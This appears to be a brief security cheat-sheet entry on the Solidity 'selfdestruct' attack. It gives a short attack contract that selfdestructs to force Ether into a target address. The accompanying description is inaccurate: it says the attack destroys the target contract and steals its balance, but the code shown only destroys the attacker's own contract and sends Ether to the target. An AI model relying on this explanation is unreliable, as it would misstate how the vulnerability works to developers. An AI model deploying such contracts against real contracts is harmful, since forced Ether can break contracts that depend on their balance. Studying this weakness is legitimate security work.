# Self Destruct Attack

Solidity’s ‘selfdestruct’ function may be used to destruct a target contract and steal the balance by an attacker.

### Create a Malicious Contract for Destructing Contract <a href="#create-a-malicious-contract-for-destructing-contract" id="create-a-malicious-contract-for-destructing-contract"></a>

```shellscript
// SPDX-License-Identifier: MIT
pragma solidity ^0.4.0;

contract Attack {
    function attack(address _address) payable public {
        // the remaining Ether sent to _address when destructing
        selfdestruct(_address);
    }
}
```
